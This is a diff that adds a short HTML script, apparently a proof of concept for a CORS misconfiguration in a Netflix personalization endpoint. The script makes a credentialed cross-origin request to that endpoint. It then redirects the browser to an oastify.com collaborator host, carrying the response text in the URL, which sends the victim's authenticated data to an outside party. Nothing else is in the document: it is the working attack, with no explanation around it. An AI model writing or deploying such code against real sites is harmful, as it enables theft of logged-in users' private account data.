@@ -1,0 +1,13 @@
+<script>
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','netflix.com/personalization/log',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='d5jnx1ecbjr2p033vayv26todfjsxbhtlwa.oastify.com/log?key='+this.responseText;
+};
+
+</script>
